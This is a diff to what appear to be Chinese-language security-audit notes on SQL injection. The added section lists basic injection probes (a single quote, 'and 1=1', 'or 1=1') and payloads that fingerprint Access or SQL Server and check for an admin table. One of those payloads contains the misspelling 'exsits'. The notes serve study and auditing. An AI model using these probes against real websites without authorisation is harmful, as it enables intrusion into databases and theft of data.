@@ -13,6 +13,24 @@ SQL注入的目的
 4. 读写文件
 
 
+注入过程
+--------------------------------
+1. 判断注入点
+    '
+    and 1=1
+    and 1=2
+    or 1=1
+    or 1=2
+    and 1=23
+
+2. 若存在注入点,判断数据库类型
+    and exists (select * from msysobjects ) > 0 //access数据库
+    and exists (select * from sysobjects ) > 0 //SQLServer数据库
+3. 判断数据库表
+    and exsits (select * from admin)
+
+
+
 审计时看什么
 --------------------------------
 1. 看全局过滤能否bypass
